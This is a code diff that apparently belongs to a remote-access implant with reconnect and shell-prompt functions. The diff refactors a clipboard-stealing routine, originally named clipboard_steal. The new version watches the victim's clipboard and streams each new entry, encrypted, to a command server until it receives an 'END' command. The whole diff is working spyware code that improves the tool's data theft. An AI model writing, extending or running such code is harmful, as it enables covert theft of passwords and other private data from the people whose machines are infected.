@@ -302,66 +302,59 @@ def reconnect_server(srv_ip, srv_port, conn_obj):
     return conn_obj, symmetric_key
 
 def clipboard_main(conn_obj):
-    stop_flag = threading.Event()
-    result = [None]  # Use a list to hold the result to allow modification from the thread
-    lock = threading.Lock()  # Lock for thread-safe access to the result variable
-    
-    # Clear clipboard to ensure new data is captured
-    pyperclip.copy('')
+    """Send clipboard data to the server until an ``END`` command is received."""
 
-    def clipboard_steal(clipboard_data):
+    stop_flag = threading.Event()
+    lock = threading.Lock()
+
+    if not pyperclip.is_available():
+        conn_obj.sendall(encrypt_message("NOCLIP"))
+        return "Clipboard unavailable"
+
+    try:
+        pyperclip.copy("")
+    except pyperclip.PyperclipException:
+        conn_obj.sendall(encrypt_message("NOCLIP"))
+        return "Clipboard unavailable"
+
+    def clipboard_sender() -> None:
         while not stop_flag.is_set():
             try:
                 info = pyperclip.waitForNewPaste(1)
                 if isinstance(info, str) and info.strip():
-                    updated_clipboard = (info.strip()[:120]).replace('\n', ' ')  # Trim spaces, limit to 120 chars, replace newlines
+                    updated = (info.strip()[:120]).replace("\n", " ")
                     if len(info) > 120:
-                        updated_clipboard = updated_clipboard.strip() + " (Cropped)"  # Tell user data was cut due to length and strip again
+                        updated = updated.strip() + " (Cropped)"
                     with lock:
-                        clipboard_data.add(updated_clipboard)
+                        conn_obj.sendall(encrypt_message(updated))
             except pyperclip.PyperclipTimeoutException:
-                continue  # Timeout occurred
+                continue
+            except Exception:
+                continue
 
-    def clipboard_steal_end(conn_obj, clipboard_data):
+    def check_for_end() -> None:
         while not stop_flag.is_set():
             try:
                 server_message = decrypt_message(conn_obj.recv(4096)).strip()
                 if server_message == "END":
                     stop_flag.set()
-                    
-                    with lock:
-                        if len(clipboard_data) == 0:
-                            result[0] = "No data captured"
-                        else:
-                            clipboard_data_list = list(clipboard_data)  # List allows us to encode                    
-                            concatenated_data = "\n".join(clipboard_data_list)  # Join list items into a single string with newline as delimiter
-                            result[0] = concatenated_data  # Store plain text result
             except s.error:
-                continue  # Timeout occurred
-            except Exception as e:
-                with lock:
-                    result[0] = f"Fail: {e}"
-                return
+                continue
+            except Exception:
+                stop_flag.set()
 
-    clipboard_data = set()  # Use set to remove duplicates
-    thread_clipboard_steal = threading.Thread(target=clipboard_steal, args=(clipboard_data,))
-    thread_steal_end = threading.Thread(target=clipboard_steal_end, args=(conn_obj, clipboard_data))
+    sender_thread = threading.Thread(target=clipboard_sender, daemon=True)
+    end_thread = threading.Thread(target=check_for_end, daemon=True)
 
-    # Start the threads
-    thread_clipboard_steal.start()
-    thread_steal_end.start()
-
-    # Send encrypted "STARTED" message to server
     conn_obj.sendall(encrypt_message("STARTED"))
 
-    # Join the threads
-    thread_clipboard_steal.join()
-    thread_steal_end.join()
+    sender_thread.start()
+    end_thread.start()
 
-    # Retrieve the result from the shared variable
-    final_result = result[0]
-    
-    return final_result
+    sender_thread.join()
+    end_thread.join()
+
+    return "completed"
 
 def shell_prompt():
     username_shell = ''
